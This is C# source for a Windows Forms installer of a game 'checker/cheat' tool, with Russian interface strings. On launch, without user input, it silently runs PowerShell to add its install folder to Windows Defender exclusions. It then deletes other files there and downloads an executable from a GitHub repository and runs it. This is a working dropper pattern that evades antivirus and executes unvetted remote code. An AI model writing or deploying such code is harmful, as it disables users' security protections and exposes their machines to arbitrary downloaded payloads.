using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;

namespace purecs2CC_Installer
{
    public partial class Form1 : Form
    {
        private static readonly string directoryPath = @"C:\purecs2-Checker-Cheat\";
        private static readonly string versionUrl = "https://github.com/immanuel1618/purecs2-Checker-Cheat/raw/main/v.txt";

        public Form1()
        {
            InitializeComponent();
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            lblStatus.Text = "Подготовка...";
            await Install();
        }
        

        private async void btnStart_Click(object sender, EventArgs e)
        {
            lblStatus.Text = "Подготовка...";
            await Install();
        }

        private async Task Install()
        {
            EnsureDirectoryExists();
            AddToWindowsDefenderExceptions();
            CleanDirectory();

            string version = await GetVersionFromFile();
            if (string.IsNullOrEmpty(version))
            {
                MessageBox.Show("Ошибка получения версии.", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string filePath = Path.Combine(directoryPath, $"purecs2CC{version}.exe");
            if (File.Exists(filePath))
            {
                lblStatus.Text = "Файл уже существует. Запуск...";
                RunFile(filePath);
                return;
            }

            string fileUrl = $"https://github.com/immanuel1618/purecs2-Checker-Cheat/raw/main/purecs2CC{version}.exe";
            await DownloadFileWithProgress(fileUrl, filePath);

            RunFile(filePath);
        }

        private void EnsureDirectoryExists()
        {
            if (!Directory.Exists(directoryPath))
            {
                Directory.CreateDirectory(directoryPath);
            }
        }


        private void AddToWindowsDefenderExceptions()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"-Command \"Add-MpPreference -ExclusionPath '{directoryPath}'\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(psi);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Ошибка при добавлении в исключения: " + ex.Message, "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void CleanDirectory()
        {
            foreach (var file in Directory.GetFiles(directoryPath))
            {
                if (!file.Contains("purecs2CC")) File.Delete(file);
            }
        }

        private async Task<string> GetVersionFromFile()
        {
            using HttpClient client = new HttpClient();
            try
            {
                return (await client.GetStringAsync(versionUrl)).Trim();
            }
            catch
            {
                return string.Empty;
            }
        }

        private async Task DownloadFileWithProgress(string url, string filePath)
        {
            using HttpClient client = new HttpClient();
            using HttpResponseMessage response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
            response.EnsureSuccessStatusCode();

            long totalBytes = response.Content.Headers.ContentLength ?? 0;
            using Stream contentStream = await response.Content.ReadAsStreamAsync();
            using FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None);

            byte[] buffer = new byte[8192];
            long totalRead = 0;
            int read;
            while ((read = await contentStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
            {
                await fileStream.WriteAsync(buffer, 0, read);
                totalRead += read;
                int percent = totalBytes > 0 ? (int)(totalRead * 100 / totalBytes) : 0;

                progressBar1.Value = percent;
                lblStatus.Text = $"Загрузка: {percent}%";
                Application.DoEvents();
            }

            lblStatus.Text = "Загрузка завершена.";
        }

        private void RunFile(string filePath)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true
                };
                Process.Start(psi);
                lblStatus.Text = "Запуск выполнен.";
                Application.Exit(); // Закрываем установщик после запуска
            }
            catch (Exception ex)
            {
                MessageBox.Show("Ошибка при запуске: " + ex.Message, "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }
    }
}
